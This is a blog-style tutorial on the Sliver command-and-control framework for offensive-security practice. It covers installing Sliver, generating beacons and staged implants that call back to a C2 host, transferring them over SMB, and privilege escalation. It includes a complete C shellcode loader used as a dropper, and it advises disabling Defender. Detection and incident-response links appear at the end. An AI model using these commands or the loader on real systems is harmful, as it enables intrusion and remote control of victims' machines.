---
title: "Sliver C2"
classes: wide
header:  
  teaser: /assets/images/posts/c2/c2-teaser.jpg
  overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Starting with Sliver C2"
description: "Starting with Sliver C2"
categories:
  - c2
tags:
  - c2
  - sliver
toc: false
---

# SLIVER

<img src="/assets/images/posts/c2/c2-teaser.jpg" alt="Alt text" width="500" class="align-center">


## DOC

https://sliver.sh/

https://github.com/BishopFox/sliver

## Installation
curl https://sliver.sh/install|sudo bash


u can start the server with systemctl 


run:
```
sliver
```

## Types of implants

- Beacons = will check in with your Server from time to time to see if u wrote some command to be executed
- Session = its real time response, similar to a reverse shell 

> Similar but not the same. Shell is even easier to detect

Generating the Beacon:
```
generate beacon --http <C2 IP> --save .
```

![Alt text](/assets/images/posts/c2/1.png){: .align-center}


After that, u can run SMB SERVER using IMPACKET to transfer it to the remote Windows Machine
```
smbserver.py kali . -smb2support -username anon -password anon
```

![Alt text](/assets/images/posts/c2/2.png){: .align-center}


**On Windows**

Connect:
```
net use \\<C2 ip>\kali /USER:anon anon
```

Copy the File:
```
copy \\<C2 ip>\kali\<beacon.exe> .
```
![Alt text](/assets/images/posts/c2/3.png){: .align-center}

![Alt text](/assets/images/posts/c2/4.png){: .align-center}


> Bypass in necessary if the AV/EDR are enable (So, for now just disable Defender)

> I'll write about evasion in future posts and How to use staged payloads in Sliver

## Listener

- http/https - for communication over the HTTP(S) protocol, pretty standard across any C2     
- mtls - communication using mutual-TLS, a protocol in which both the implant and the server present a certificate that the other must validate. If one certificate fails, the connection does not happen. 
- wg - communication using WireGuard, which essentially creates a lightweight VPN to communicate over. 
- dns -This is all UDP and its not recommended for beginners.


> Since our beacon was only configured to have an http callback, we can run http in our shell and then execute the beacon on the remote Windows computer.

```
sliver > http
```

![Alt text](/assets/images/posts/c2/5.png){: .align-center}




## Beacons

To see the open beacons just type:
```
sliver > beacons 
```

![Alt text](/assets/images/posts/c2/6.png){: .align-center}

- As we did a Beacon instead of a Session, the beacon will check every now and then.
- Sliver also has **Jitter**, which will make the checks a little irregular so will be less suspicious

To interact:
```
use <beacon ID>
#beacons rm = to delete beacons
#beacons -k <ID or -K = to kill beacons
```

![Alt text](/assets/images/posts/c2/7.png){: .align-center}



You'll notice that it will take a time to SLIVER get the result because of the check in time

![Alt text](/assets/images/posts/c2/8.png){: .align-center}


To show commands executed before:
```
tasks

tasks fetch <ID>
```

![Alt text](/assets/images/posts/c2/9.png){: .align-center}



## sessions

U can change from beacon to session, but not vice-versa:

```
interactive
use <ID>
```

```
sessions

sessions -K = to kill all sessions
sessions -k = (lowercase) to kill specific sessions
```

![Alt text](/assets/images/posts/c2/10.png){: .align-center}



## PROFILES
Save Profile:
```
profiles new beacon --arch amd64 --os windows --mtls <C2 IP>:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 profile_name
```

Generate the beacon:
```
profiles generate --save . profile_name
```


> You can also generate session implants in the same way, just omit the beacon part. 


To show the Profiles:
```
profiles
```

To show the Implants:
```
implants
```

If u need to recover a deleted implant:

```
regenerate <name of implant>
```


## Post-Exploitation

###  Staging

- Stegeless = one single binary that connects back to u
- Staged = Dropper, its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.

Create the Profile:
```
profiles new beacon --arch amd64 --os windows --mtls <C2 IP>:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 profile_name
```

Create the Listener to the initial Callback:
```
stage-listener --url http://<C2 IP>:8080 --profile profile_name --prepend-size
```

> --prepend-size if you are going to use some as Metasploit/msfvenom stager
> Dont use the flag if you are going to write your own stager



Start the second Listener to get the second callback:
```
mtls --lhost <C2 IP> --lport 443
```


Generate the Stager:
```
generate stager -r http --lhost <C2 IP> --lport 8080
```

Example of Dropper in C:

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Define your shellcode here
unsigned char shellcode[] = {
    // Your shellcode goes here
};

int main() {
    LPVOID lpAlloc;
    DWORD dwOldProtect;
    HANDLE hThread;

    // Allocate memory
    lpAlloc = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpAlloc == NULL) {
        printf("VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(lpAlloc, shellcode, sizeof(shellcode));

    // Change memory protection
    if (!VirtualProtect(lpAlloc, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect)) {
        printf("VirtualProtect failed: %d\n", GetLastError());
        return 1;
    }

    // Create a new thread to execute shellcode
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateThread failed: %d\n", GetLastError());
        return 1;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFree(lpAlloc, 0, MEM_RELEASE);

    return 0;
}

```


> Run the Dropper to get a callback in your C2


## Armory

Its the Extension Package Manager of Sliver which allows us to install tools that other people made

To show the packages available:
```
armory
```

To install a pack:
```
armory install seatbelt
```

Execute:
```
armory -i -- -group=system
```

![Alt text](/assets/images/posts/c2/11.png){: .align-center}


##  BOF: Beacon Object Files


https://sliver.sh/docs?name=BOF+and+COFF+Support


## Detection

- https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/
- https://www.youtube.com/watch?v=izMMmOaLn9g


### Shell

remember the Session is in the currently running process, but the shell is different. Its easier to detect as we see in Windows Event:




### psexec & getsystem


> psexec works similar to impacket, it will run a binary from **C:\Windows\Temp** and give a random 10 char name

> getsystem is a macro that try to inject itself into another process **spoolsv.exe** (default) and abusing SeDebugPrivilege to get NT AUTHORITY\SYSTEM within that process (similar to meterpreter)


## Config Extraction (IR)

The key is to extract the config that is stored in the implant


https://www.youtube.com/watch?v=FiT7-zxQGbo


- Most C2s will encrypt their config and obfuscate the code 

- So the config has to be descrypted in-memory and then used


## References

https://tishina.in/opsec/sliver-opsec-notes

https://dominicbreuker.com/post/learning_sliver_c2_01_installation/#series-overview

https://notateamserver.xyz/sliver-101/
